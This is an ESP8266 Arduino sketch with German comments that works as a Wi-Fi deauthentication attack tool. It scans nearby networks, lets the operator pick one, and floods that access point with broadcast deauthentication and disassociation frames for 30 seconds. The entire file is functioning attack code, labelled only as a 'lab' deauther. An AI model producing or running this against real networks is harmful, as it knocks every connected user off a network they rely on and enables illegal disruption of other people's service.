#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
  // Diese Zeile fehlte – sie deklariert die SDK-Funktion manuell:
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

// Das Paket-Template
uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (wird AP MAC)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (wird AP MAC)
    0x00, 0x00,                         // Seq
    0x07, 0x00                          // Reason (7 = Class 3 from nonassociated)
};

void setup() {
  Serial.begin(115200);
  
  // WICHTIG für SDK 2.0.0:
  WiFi.mode(WIFI_STA);
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0); 

  Serial.println("\n--- ESP8266 Labor-Deauther (SDK 2.0.0) ---");
}

void loop() {
  // Für den Scan brauchen wir den Standard-Modus
  wifi_promiscuous_enable(0);
  Serial.println("\nScanne...");
  int n = WiFi.scanNetworks();

  if (n <= 0) {
    Serial.println("Keine Netzwerke.");
    delay(2000);
    return;
  }

  for (int i = 0; i < n; i++) {
    Serial.printf("%d: %s (CH %d)\n", i + 1, WiFi.SSID(i).c_str(), WiFi.channel(i));
  }

  Serial.println("Wähle Nummer:");
  while (!Serial.available()) { delay(10); yield(); }
  int sel = Serial.parseInt() - 1;
  while(Serial.available()) Serial.read();

  if (sel >= 0 && sel < n) {
    uint8_t* bssid = WiFi.BSSID(sel);
    int ch = WiFi.channel(sel);

    // BSSID in Paket kopieren
    memcpy(&packet[10], bssid, 6);
    memcpy(&packet[16], bssid, 6);

    // In Sende-Modus wechseln
    wifi_set_channel(ch);
    wifi_promiscuous_enable(1);

    Serial.println("Angriff gestartet... (30s)");
    unsigned long end = millis() + 30000;
    uint16_t seq = 0;

    while (millis() < end) {
      // Sequence Number Logik
      seq++;
      packet[22] = (seq << 4) & 0xFF;
      packet[23] = (seq >> 4) & 0xFF;

      // 1. Deauth schicken
      packet[0] = 0xC0;
      wifi_send_pkt_freedom(packet, 26, 0);

      // 2. Disassociate schicken (oft effektiver!)
      packet[0] = 0xA0;
      wifi_send_pkt_freedom(packet, 26, 0);

      // Kurze Pause, damit der Chip nicht überhitzt
      delay(2); 
      yield();
    }
    wifi_promiscuous_enable(0);
    Serial.println("Angriff fertig.");
  }
}
